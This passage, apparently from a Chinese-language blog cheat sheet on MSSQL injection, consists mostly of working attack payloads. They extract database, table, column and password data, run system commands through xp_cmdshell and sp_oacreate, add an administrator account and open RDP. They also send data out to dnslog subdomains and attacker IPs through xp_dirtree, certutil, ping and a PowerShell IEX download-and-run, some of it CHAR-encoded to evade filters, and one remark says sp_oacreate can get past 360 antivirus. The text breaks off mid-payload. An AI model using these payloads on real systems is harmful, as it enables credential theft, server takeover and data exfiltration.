class="operator">=</span><span class="number">1</span></span><br><span class="line">id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> user_name<span class="operator">&gt;</span><span class="number">0</span></span><br></pre></td></tr></table></figure></li><li>获取所有数据库名<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span>(<span class="keyword">select</span> name <span class="keyword">from</span> master.sys.databases <span class="keyword">where</span> database_id<span class="operator">=</span><span class="number">1</span>)<span class="operator">&gt;</span><span class="number">0</span> <span class="operator">/</span><span class="operator">/</span>取库名</span><br><span class="line">id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span>(<span class="keyword">select</span> quotename(<span class="built_in">count</span>(name)) <span class="keyword">from</span> master.sys.databases)<span class="operator">=</span><span class="number">10</span> <span class="operator">/</span><span class="operator">/</span>取库数</span><br><span class="line">id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span>(<span class="keyword">select</span> quotename(name) <span class="keyword">from</span> master.sys.databases <span class="keyword">for</span> xml path(<span class="string">&#x27;&#x27;</span>))<span class="operator">=</span><span class="number">1</span> <span class="comment">--  //一次取所有</span></span><br></pre></td></tr></table></figure></li><li>获取表名<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> test.dbo.sysobjects <span class="keyword">where</span> xtype<span class="operator">=</span><span class="string">&#x27;U&#x27;</span></span><br><span class="line"></span><br><span class="line">id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27;  and(select quotename(name) from test.dbo.sysobjects where xtype=&#x27;</span>U<span class="string">&#x27; for xml path(&#x27;&#x27;))=1 -- --  //一次取所有</span></span><br></pre></td></tr></table></figure></li><li>获取字段名 <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span>(<span class="keyword">select</span> top <span class="number">1</span> column_name <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name<span class="operator">=</span><span class="string">&#x27;user&#x27;</span>)  <span class="operator">/</span><span class="operator">/</span>获取第一个</span><br><span class="line"></span><br><span class="line">id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span>(<span class="keyword">select</span> top <span class="number">1</span> column_name <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name<span class="operator">=</span><span class="string">&#x27;user&#x27;</span> <span class="keyword">and</span> column_name <span class="keyword">not</span> <span class="keyword">in</span>(<span class="keyword">select</span> top <span class="number">2</span> column_name <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name<span class="operator">=</span><span class="string">&#x27;user&#x27;</span>))     <span class="operator">/</span><span class="operator">/</span><span class="keyword">not</span> <span class="keyword">in</span> 遍历字段名</span><br><span class="line"></span><br><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; and 1=(select quotename(name) from test.dbo.syscolumns where id =(select id from test.dbo.sysobjects where name =&#x27;</span>users<span class="string">&#x27;)  for xml path(&#x27;&#x27;))--     //一次取所有users 表所有的字段.</span></span><br></pre></td></tr></table></figure></li><li>获取数据<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span>(<span class="keyword">select</span> password <span class="keyword">from</span> <span class="keyword">user</span> <span class="keyword">where</span> id <span class="operator">=</span><span class="number">1</span>)  遍历id</span><br><span class="line">id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span>(<span class="keyword">select</span> quotename(username),quotename(password) <span class="keyword">from</span> users <span class="keyword">for</span> xml path(<span class="string">&#x27;&#x27;</span>)) <span class="operator">/</span><span class="operator">/</span>一次取所有</span><br></pre></td></tr></table></figure></li></ol><ul><li><strong>cast .. as int 报错</strong></li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span><span class="built_in">cast</span>((<span class="keyword">select</span> quotename(LoginName) <span class="keyword">from</span> test.dbo.aspcms_user) <span class="keyword">as</span> <span class="type">int</span>) <span class="comment">--+</span></span><br></pre></td></tr></table></figure><h3 id="布尔盲注过程"><a href="#布尔盲注过程" class="headerlink" title="布尔盲注过程"></a>布尔盲注过程</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">and</span> ascii(<span class="built_in">substring</span>((<span class="keyword">select</span> top <span class="number">1</span> name <span class="keyword">from</span> master.dbo.sysdatabases),<span class="number">1</span>,<span class="number">1</span>)) <span class="operator">&gt;=</span> <span class="number">109</span></span><br></pre></td></tr></table></figure><h3 id="时间盲注过程"><a href="#时间盲注过程" class="headerlink" title="时间盲注过程"></a>时间盲注过程</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">id<span class="operator">=</span><span class="number">1</span>;if (<span class="keyword">select</span> IS_SRVROLEMEMBER(<span class="string">&#x27;sysadmin&#x27;</span>))<span class="operator">=</span><span class="number">1</span> WAITFOR DELAY <span class="string">&#x27;0:0:5&#x27;</span><span class="comment">--</span></span><br><span class="line"></span><br><span class="line">id<span class="operator">=</span><span class="number">1</span>;if (ascii(<span class="built_in">substring</span>((<span class="keyword">select</span> top <span class="number">1</span> name <span class="keyword">from</span> master.dbo.sysdatabases),<span class="number">1</span>,<span class="number">1</span>)))<span class="operator">&gt;</span><span class="number">1</span> WAITFOR DELAY <span class="string">&#x27;0:0:5&#x27;</span><span class="comment">--</span></span><br></pre></td></tr></table></figure><h2 id="存储过程提权"><a href="#存储过程提权" class="headerlink" title="存储过程提权"></a>存储过程提权</h2><p>扩展存储过程是MSsql提供的特殊功能。所谓“扩展存储过程”，其实就是一个普通的Windows系统DLL文件，按照某种规则实现了某些函数功能。</p><ul><li><strong>前提：数据库是db_owner权限</strong></li></ul><table><thead><tr><th>扩展存储过程</th><th>说明</th></tr></thead><tbody><tr><td>xp_cmdshell</td><td>直接执行系统命令</td></tr><tr><td>xp_regread</td><td>进行注册表读取</td></tr><tr><td>xp_regwrite</td><td>写入注册表</td></tr><tr><td>xp_dirtree</td><td>进行列目录操作</td></tr><tr><td>xp_ntsec_enumdomains</td><td>查看domain信息</td></tr></tbody></table><ul><li><strong>XP_cmdshell</strong></li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id<span class="operator">=</span><span class="number">1</span>;<span class="keyword">exec</span> master.sys.xp_cmdshell <span class="string">&#x27;net user&#x27;</span></span><br></pre></td></tr></table></figure><p>2008默认是没有开启的,而且2008不像以前的版本可以直接加管理员账号了,需要写shell或者执行CS木马上线提权.</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">;<span class="keyword">EXEC</span> sp_configure <span class="string">&#x27;show advanced options&#x27;</span>,<span class="number">1</span>;</span><br><span class="line"><span class="operator">/</span><span class="operator">/</span>允许修改高级参数</span><br><span class="line">RECONFIGURE;</span><br><span class="line">;<span class="keyword">EXEC</span> sp_configure <span class="string">&#x27;xp_cmdshell&#x27;</span>,<span class="number">1</span>;</span><br><span class="line"><span class="operator">/</span><span class="operator">/</span>打开xp_cmdshell扩展</span><br><span class="line">RECONFIGURE;<span class="comment">--</span></span><br></pre></td></tr></table></figure><ul><li><strong>sp_oacreate</strong></li></ul><p>当xpcmdshell 被删除可以使用这个来提权试试,恢复spoacreate,沙盒模式,可以过360!</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">EXEC</span> sp_configure <span class="string">&#x27;show advanced options&#x27;</span>,<span class="number">1</span>;</span><br><span class="line">RECONFIGURE <span class="keyword">WITH</span> OVERRIDE</span><br><span class="line">;<span class="keyword">EXEC</span> sp_configure <span class="string">&#x27;Ole Automation Procedures&#x27;</span>,<span class="number">1</span></span><br><span class="line">;RECONFIGURE <span class="keyword">WITH</span> OVERRIDE</span><br><span class="line">;<span class="keyword">EXEC</span> sp_configure <span class="string">&#x27;show advanced options&#x27;</span>,<span class="number">0</span>;</span><br></pre></td></tr></table></figure><p>spoacreate是一个非常危险的存储过程可以删除、复制、移动文件 还能配合spoamethod 来写文件执行cmd</p><p>在以前的系统有这几种用法,调用cmd 来执行命令,写入启动项,粘贴键替换</p><ul><li><strong>xp_cmdshell 外带判断执行</strong></li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">exec</span> master..xp_cmdshell &quot;powershell IEX (new-object net.webclient).downloadstring(&#x27;http://172.16.12.*:9000&#x27;)&quot;</span><br></pre></td></tr></table></figure><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">exec</span> master..xp_cmdshell &quot;net user zs p@ssw0rd /add&quot;</span><br><span class="line"><span class="keyword">exec</span> master..xp_cmdshell &quot;net localgroup administrators zs /add&quot;</span><br></pre></td></tr></table></figure><ul><li><strong>开启3389</strong></li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">exec</span> master..xp_cmdshell &quot;REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal&quot;&quot; &quot;&quot;Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f&quot;</span><br></pre></td></tr></table></figure><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> &quot;hello word &quot;&quot;!&quot;   <span class="operator">/</span><span class="operator">/</span>mssql特性:两个双引号为 <span class="operator">/</span>转义符号</span><br></pre></td></tr></table></figure><ul><li><strong>判断xp_cmdshell 是否成功</strong></li></ul><p>新建一个库,把查询结果写到表里,然后在查询出来,进行判断是否开启成功,和查询执行回显</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27;; create table sqldata(result VARCHAR(8000)); --   #新建一个表</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">?id=1&#x27;</span>; <span class="keyword">INSERT</span> <span class="keyword">INTO</span> sqldata (<span class="keyword">result</span>) <span class="keyword">EXEC</span> master..xp_cmdshell <span class="string">&#x27;echo xxx&#x27;</span><span class="comment">--#写表内容</span></span><br><span class="line"></span><br><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; and 1&lt;char(126)%2b(select top 1 cast(result as varchar(8000)) from sqldata where result not in (select top 0 isnull(result,&#x27;&#x27;) from sqldata )) -- </span></span><br><span class="line"><span class="string">#查询内容</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">?id=1&#x27;</span>; <span class="keyword">delete</span> <span class="keyword">from</span> sqldata; <span class="comment">--  #清空上一条查询内容.</span></span><br><span class="line"></span><br><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27;; INSERT INTO sqldata (result) EXEC master..xp_cmdshell &#x27;</span>net <span class="keyword">user</span><span class="string">&#x27;--  </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">?id=1&#x27;</span> <span class="keyword">and</span> <span class="number">1</span><span class="operator">&lt;</span><span class="type">char</span>(<span class="number">126</span>)<span class="operator">%</span><span class="number">2</span>b(<span class="keyword">select</span> top <span class="number">1</span> <span class="built_in">cast</span>(<span class="keyword">result</span> <span class="keyword">as</span> <span class="type">varchar</span>(<span class="number">8000</span>)) <span class="keyword">from</span> sqldata <span class="keyword">where</span> <span class="keyword">result</span> <span class="keyword">not</span> <span class="keyword">in</span> (<span class="keyword">select</span> top <span class="number">0</span> isnull(<span class="keyword">result</span>,<span class="string">&#x27;&#x27;</span>) <span class="keyword">from</span> sqldata )) <span class="comment">--</span></span><br></pre></td></tr></table></figure><h2 id="外带查询"><a href="#外带查询" class="headerlink" title="外带查询"></a>外带查询</h2><p><strong>xp_dirtree</strong> </p><p>是一个列目录的mssql函数, 结合 \\ Smb(文件共享)资源匹配符来访问 dns解析域名.</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">declare</span> <span class="variable">@a</span> <span class="type">varchar</span>(<span class="number">1024</span>);    <span class="comment">--定义一个变量</span></span><br><span class="line"><span class="keyword">set</span> <span class="variable">@a</span><span class="operator">=</span><span class="string">&#x27;\\&#x27;</span><span class="operator">+</span>master.dbo.fn_varbintohexstr(<span class="keyword">CONVERT</span>( <span class="type">varbinary</span>(max), <span class="built_in">substring</span>(@<span class="variable">@version</span>,<span class="number">1</span>,<span class="number">15</span>)))<span class="operator">+</span><span class="string">&#x27;.j2bg99.dnslog.cn&#x27;</span>;    <span class="operator">/</span><span class="operator">/</span>变量赋值</span><br><span class="line"><span class="keyword">exec</span> xp_dirtree <span class="variable">@a</span>;         <span class="operator">/</span><span class="operator">/</span>执行变量</span><br><span class="line"></span><br><span class="line">#把单引号转成<span class="type">char</span></span><br><span class="line"><span class="keyword">declare</span> <span class="variable">@a</span> <span class="type">varchar</span>(<span class="number">1024</span>);</span><br><span class="line"><span class="keyword">set</span> <span class="variable">@a</span><span class="operator">=</span><span class="type">CHAR</span>(<span class="number">92</span>)<span class="operator">+</span><span class="type">CHAR</span>(<span class="number">92</span>)<span class="operator">+</span>master.dbo.fn_varbintohexstr(<span class="keyword">CONVERT</span>( <span class="type">varbinary</span>(max), <span class="built_in">substring</span>(@<span class="variable">@version</span>,<span class="number">1</span>,<span class="number">15</span>)))<span class="operator">+</span><span class="type">CHAR</span>(<span class="number">46</span>)<span class="operator">+</span><span class="type">CHAR</span>(<span class="number">111</span>)<span class="operator">+</span><span class="type">CHAR</span>(<span class="number">115</span>)<span class="operator">+</span><span class="type">CHAR</span>(<span class="number">55</span>)<span class="operator">+</span><span class="type">CHAR</span>(<span class="number">116</span>)<span class="operator">+</span><span class="type">CHAR</span>(<span class="number">99</span>)<span class="operator">+</span><span class="type">CHAR</span>(<span class="number">118</span>)<span class="operator">+</span><span class="type">CHAR</span>(<span class="number">46</span>)<span class="operator">+</span><span class="type">CHAR</span>(<span class="number">100</span>)<span class="operator">+</span><span class="type">CHAR</span>(<span class="number">110</span>)<span class="operator">+</span><span class="type">CHAR</span>(<span class="number">115</span>)<span class="operator">+</span><span class="type">CHAR</span>(<span class="number">108</span>)<span class="operator">+</span><span class="type">CHAR</span>(<span class="number">111</span>)<span class="operator">+</span><span class="type">CHAR</span>(<span class="number">103</span>)<span class="operator">+</span><span class="type">CHAR</span>(<span class="number">46</span>)<span class="operator">+</span><span class="type">CHAR</span>(<span class="number">99</span>)<span class="operator">+</span><span class="type">CHAR</span>(<span class="number">110</span>);</span><br><span class="line"><span class="keyword">exec</span> xp_dirtree <span class="variable">@a</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">declare</span> <span class="variable">@a</span> <span class="type">varchar</span>(<span class="number">1024</span>);</span><br><span class="line"><span class="keyword">set</span> <span class="variable">@a</span><span class="operator">=</span><span class="string">&#x27;\\&#x27;</span><span class="operator">+</span> master.dbo.fn_varbintohexstr(<span class="keyword">CONVERT</span>( <span class="type">varbinary</span>(max), (<span class="keyword">select</span> top <span class="number">1</span> name <span class="keyword">from</span> master.dbo.sysdatabases <span class="keyword">where</span> name <span class="keyword">not</span> <span class="keyword">in</span> (<span class="keyword">select</span> top <span class="number">0</span> name <span class="keyword">from</span> master.dbo.sysdatabases))))<span class="operator">+</span><span class="string">&#x27;.j2bg99.dnslog.cn&#x27;</span>;</span><br><span class="line"><span class="keyword">exec</span> xp_dirtree <span class="variable">@a</span>;</span><br></pre></td></tr></table></figure><p><strong>certutil.exe</strong> </p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">declare</span> <span class="variable">@a</span> <span class="type">varchar</span>(<span class="number">1024</span>);</span><br><span class="line"><span class="keyword">set</span> <span class="variable">@a</span><span class="operator">=</span><span class="string">&#x27;certutil.exe -urlcache -split -f http://192.168.21.66:9000/?data=&#x27;</span><span class="operator">+</span>master.dbo.fn_varbintohexstr(<span class="keyword">CONVERT</span>( <span class="type">varbinary</span>(max), @<span class="variable">@version</span>))<span class="operator">+</span><span class="string">&#x27; c:\windows\temp\temp.db&#x27;</span>;</span><br><span class="line"><span class="keyword">select</span> <span class="variable">@a</span>;</span><br><span class="line"><span class="keyword">exec</span> xp_cmdshell <span class="variable">@a</span>;</span><br></pre></td></tr></table></figure><p><strong>ping</strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">declare</span> <span class="variable">@a</span> <span class="type">varchar</span>(<span class="number">1024</span>);</span><br><span class="line"><span class="keyword">set</span> <span class="variable">@a</span><span class="operator">=</span><span class="string">&#x27;ping -n 2 &#x27;</span><span class="operator">+</span>master.dbo.fn_varbintohexstr(<span class="keyword">CONVERT</span>( <span class="type">varbinary</span>(max), <span class="built_in">substring</span>(@<span class="variable">@version</span>,<span class="number">1</span>,<span class="number">15</span>)))<span class="operator">+</span><span class="string">&#x27;.os7tcv.dnslog.cn&#x27;</span>;</span><br><span class="line"><span class="keyword">select</span> <span class="variable">@a</span>;</span><br><span class="line"><span class="keyword">exec</span> xp_cmdshell <span class="variable">@a</span>;</span><br><span class="line"></span><br><span class="line">#把单引号转成<span class="type">char</span></span><br><span class="line"><span class="keyword">declare</span> <span class="variable">@a</span> <span class="type">varchar</span>(<span class="number">1024</span>);</span><br><span class="line"><span class="keyword">set</span> <span class="variable">@a</span><span class="operator">=</span> <span class="type">CHAR</span>(<span class="number">112</span>) <span class="operator">+</span> <span class="type">CHAR</span>(<span class="number">105</span>) <span class="operator">+</span> <span class="type">CHAR</span>(<span class="number">110</span>) <span class="operator">+</span> <span class="type">CHAR</span>(<span class="number">103</span>) <span class="operator">+</span> <span class="type">CHAR</span>(<span class="number">32</span>) <span class="operator">+</span> <span class="type">CHAR</span>(<span class="number">45</span>) <span class="operator">+</span> <span class="type">CHAR</span>(<span class="number">110</span>) <span class="operator">+</span> <span class="type">CHAR</span>(<span class="number">32</span>) <span class="operator">+</span> <span class="type">CHAR</span>(<span class="number">50</span>) <span class="operator">+</span> <span class="type">CHAR</span>(<span class="number">32</span>)<span class="operator">+</span>master.dbo.fn_varbintohexstr(<span class="keyword">CONVERT</span>( <span class="type">varbinary</span>(max), <span class="built_in">substring</span>(@<span class="variable">@version</span>,<span class="number">1</span>,<span class="number">15</span>)))<span class="operator">+</span> <span class="type">CHAR</span>(<span class="number">46</span>) <span class="operator">+</span> <span class="type">CHAR</span>(<span class="number">111</span>) <span class="operator">+</span> <span class="type">CHAR</span>(<span class="number">115</span>) <span class="operator">+</span> <span class="type">CHAR</span>(<span class="number">55</span>) <span class="operator">+</span> <span class="type">CHAR</span>(<span class="number">116</span>) <span class="operator">+</span> <span class="type">CHAR</span>(<span class="number">99</span>) <span class="operator">+</span> <span class="type">CHAR</span>(<span class="number">118</span>) <span class="operator">+</span> <span class="type">CHAR</span>(<span class="number">46</span>) <span class="operator">+</span> <span class="type">CHAR</span>(<span class="number">100</span>) <span class="operator">+</span> <span class="type">CHAR</span>(<span class="number">110</span>) <span class="operator">+</span> <span class="type">CHAR</span>(<span class="number">115</span>) <span class="operator">+</span> <span class="type">CHAR</span>(<span class="number">108</span>) <span class="operator">+</span> <span class="type">CHAR</span>(<span class="number">111</span>) <span class="operator">+</span> <span class="type">CHAR</span>(<span class="number">103</span>) <span class="operator">+</span> <span class="type">CHAR</span>(<span class="number">46</span>) <span class="operator">+</span> <span class="type">CHAR</span>(<span class="number">99</span>) <span class="operator">+</span> <span class="type">CHAR</span>(<span class="number">110</span>);</span><br><span class="line"><span class="keyword">select</span> <span class="variable">@a</span>;</span><br><span class="line"><span class="keyword">exec</span> xp_cmdshell <span class="variable">@a</span>;</span><br></pre></td></tr></table></figure><p><strong>powershell</strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">declare</span> <span class="variable">@a</span> <span class="type">varchar</span>(<span class="number">1024</span>);</span><br><span class="line"><span class="keyword">set</span> <span class="variable">@a</span><span class="operator">=</span><span class="string">&#x27;powershell IEX (new-object net.webclient).downloadstring(&#x27;&#x27;http://192.168.21.66:9000/?data=&#x27;</span><span class="operator">+</span>master.dbo.fn_varbintohexstr(<span class="keyword">CONVERT</span>( <span class="type">varbinary</span>(max), @<span class="variable">@version</span>))<span class="operator">+</span><span class="string">&#x27;&#x27;&#x27;)&#x27;</span>;</span><br><span class="line"><span class="keyword">select</span> <span class="variable">@a</span>;</span><br><span class="line"><span class="keyword">exec</span> xp_cmdshell <span class="variable">@a</span>;</span><br><span class="line"></span><br><span class="line">#把单引号转成<span class="type">char</span></span><br><span class="line"><span class="keyword">declare</span> <span class="variable">@a</span> <span class="type">varchar</span>(<span class="number">1024</span>);</span><br><span class="line"><span class="keyword">set</span> <span class="variable">@a</span><span class="operator">=</span><span class="type">CHAR</span>(<span class="number">112</span>) <span class="operator">+</span> <span class="type">CHAR</span>(<span class="number">111</span>) <span class="operator">+</span> <span class="type">CHAR</span>(<span class="number">119</span>) <span class="operator">+</span> <span class="type">CHAR</span>(<span class="number">101</span>) <span class="operator">+</span> <span class="type">CHAR</span>(<span class="number">114</span>) <span class="operator">+</span> <span class="type">CHAR</span>(<span class="number">115</span>) <span class="operator">+</span> <span class="type">CHAR</span>(<span class="number">104</span>) <span class="operator">+</span> <span class="type">CHAR</span>(<span class="number">101</span>) <span class="operator">+</span> <span class="type">CHAR</span>(<span class="number">108</span>) <span class="operator">+</span> <span class="type">CHAR</span>(<span class="number">108</span>) <span class="operator">+</span> <span class="type">CHAR</span>(<span class="number">32</span>) <span class="operator">+</span> <span class="type">CHAR</span>(<span class="number">73</span>) <span class="operator">+</span> <span class="type">CHAR</span>(<span class="number">69</span>) <span class="operator">+</span> <span class="type">CHAR</span>(<span class="number">88</span>) <span class="operator">+</span> <span class="type">CHAR</span>(<span class="number">32</span>) <span class="operator">+</span> <span class="type">CHAR</span>(<span class="number">40</span>) <span class="operator">+</span> <span class="type">CHAR</span>(<span class="number">110</span>) <span class="operator">+</span> <span class="type">CHAR</span>(<span class="number">101</span>) <span class="operator">+</span> <span class="type">CHAR</span>(<span class="number">119</span>) <span class="operator">+</span> <span class="type">CHAR</span>(<span class="number">45</span>) <span class="operator">+</span> <span class="type">CHAR</span>(<span class="number">111</span>) <span class="operator">+</span> <span class="type">CHAR</span>(<span class="number">98</span>) <span class="operator">+</span> <span class="type">CHAR</span>(<span class="number">106</span>) <span class="operator">+</span> <span class="type">CHAR</span>(<span class="number">101</span>) <span class="operator">+</span> <span class="type">CHAR</span>(<span class="number">99</span>) <span class="operator">+</span> <span class="type">CHAR</span>(<span class="number">116</span>) <span class="operator">+</span> <span class="type">CHAR</span>(<span class="number">32</span>) <span class="operator">+</span> <span class="type">CHAR</span>(<span class="number">110</span>) <span class="operator">+</span> <span class="type">CHAR</span>(<span class="number">101</span>) <span class="operator">+</span> <span class="type">CHAR</span>(<span class="number">116</span>) <span class="operator">+</span> <span class="type">CHAR</span>(<span class="number">46</span>) <span class="operator">+</span> <span class="type">CHAR</span>(<span class="number">119</span>) <span class="operator">+</span> <span class="type">CHAR</span>(<span class="number">101</span>) <span class="operator">+</span> <span class="type">CHAR</span>(<span class="number">98</span>) <span class="operator">+</span> <span class="type">CHAR</span>(<span class="number">99</span>) <span class="operator">+</span> <span class="type">CHAR</span>(<span class="number">108</span>) <span class="operator">+</span> <span class="type">CHAR</span>(<span class="number">105</span>) <span class="operator">+</span> <span class="type">CHAR</span>(<span class="number">101</span>) <span class="operator">+</span> <span class="type">CHAR</span>(<span class="number">110</span>) <span class="operator">+</span> <span class="type">CHAR</span>(<span class="number">116</span>) <span class="operator">+</span> <span class="type">CHAR</span>(<span class="number">41</span>) <span class="operator">+</span> <span class="type">CHAR</span>(<span class="number">46</span>) <span class="operator">+</span> <span class="type">CHAR</span>(<span class="number">100</span>) <span class="operator">+</span> <span class="type">CHAR</span>(<span class="number">111</span>) <span class="operator">+</span> <span class="type">CHAR</span>(<span class="number">119</span>) <span class="operator">+</span> <span class="type">CHAR</span>(<span class="number">110</span>) <span class="operator">+</span> <span class="type">CHAR</span>(<span class="number">108</span>) <span class="operator">+</span> <span class="type">CHAR</span>(<span class="number">111</span>) <span class="operator">+</span> <span class="type">CHAR</span>(<span class="number">97</span>) <span class="operator">+</span> <span class="type">CHAR</span>(<span class="number">100</span>) <span class="operator">+</span> <span class="type">CHAR</span>(<span class="number">115</span>) <span class="operator">+</span> <span class="type">CHAR</span>(<span class="number">116</span>) <span class="operator">+</span> <span class="type">CHAR</span>(<span class="number">114</span>) <span class="operator">+</span> <span class="type">CHAR</span>(<span class="number">105</span>) <span class="operator">+</span> <span class="type">CHAR</span>(<span class="number">110</span>) <span class="operator">+</span> <span class="type">CHAR</span>(<span class="number">103</span>) <span class="operator">+</span> <span class="type">CHAR</span>(<span class="number">40</span>) <span class="operator">+</span> <span class="type">CHAR</span>(<span class="number">39</span>) <span class="operator">+</span> <span class="type">CHAR</span>(<span class="number">104</span>) <span class="operator">+</span> <span class="type">CHAR</span>(<span class="number">116</span>) <span class="operator">+</span> <span class="type">CHAR</span>(<span class="number">116</span>) <span class="operator">+</span> <span class="type">CHAR</span>(<span class="number">112</span>) <span class="operator">+</span> <span class="type">CHAR</span>(<span class="number">58</span>) <span class="operator">+</span> <span class="type">CHAR</span>(<span class="number">47</span>) <span class="operator">+</span> <span class="type">CHAR</span>(<span class="number">47</span>) <span class="operator">+</span> <span class="type">CHAR</span>(<span class="number">49</span>) <span class="operator">+</span> <span class="type">CHAR</span>(<span class="number">57</span>) <span class="operator">+</span> <span class="type">CHAR</span>(<span class="number">50</span>) <span class="operator">+</span> <span class="type">CHAR</span>(<span class="number">46</span>) <span class="operator">+</span> <span class="type">CHAR</span>(<span class="number">49</span>) <span class="operator">+</span> <span class="type">CHAR</span>(<span class="number">54</span>) <span class="operator">+</span> <span class="type">CHAR</span>(<span class="number">56</span>) <span class="operator">+</span> <span class="type">CHAR</span>(<span class="number">46</span>) <span class="operator">+</span> <span class="type">CHAR</span>(<span class="number">50</span>) <span class="operator">+</span> <span class="type">CHAR</span>(<span class="number">49</span>) <span class="operator">+</span> <span class="type">CHAR</span>(<span class="number">46</span>) <span class="operator">+</span> <span class="type">CHAR</span>(<span class="number">54</span>) <span class="operator">+</span> <span class="type">CHAR</span>(<span class="number">54</span>) <span class="operator">+</span> <span class="type">CHAR</span>(<span class="number">58</span>) <span class="operator">+</span> <span class="type">CHAR</span>(<span class="number">57</span>) <span class="operator">+</span> <span class="type">CHAR</span>(<span class="number">48</span>) <span class="operator">+</span> <span class="type">CHAR</span>(<span class="number">48</span>) <span class="operator">+</span> <span class="type">CHAR</span>(<span class="number">48</span>) <span class="operator">+</span> <span class="type">CHAR</span>(<span class="number">47</span>) <span class="operator">+</span> <span class="type">CHAR</span>(<span class="number">63</span>) <span class="operator">+</span> <span class="type">CHAR</span>(<span class="number">100</span>) <span class="operator">+</span> <span class="type">CHAR</span>(<span class="number">97</span>) <span class="operator">+</span> <span class="type">CHAR</span>(<span class="number">116</span>) <span class="operator">+</span> <span class="type">CHAR</span>(<span class="number">97</span>) <span class="operator">+</span> <span class="type">CHAR</span>(<span class="number">61</span>)<span class="operator">+</span>master.dbo.fn_varbintohexstr(<span class="keyword">CONVERT</span>( <span class="type">varbinary</span>(max), @<span class="variable">@version</span>))<span class="operator">+</span> 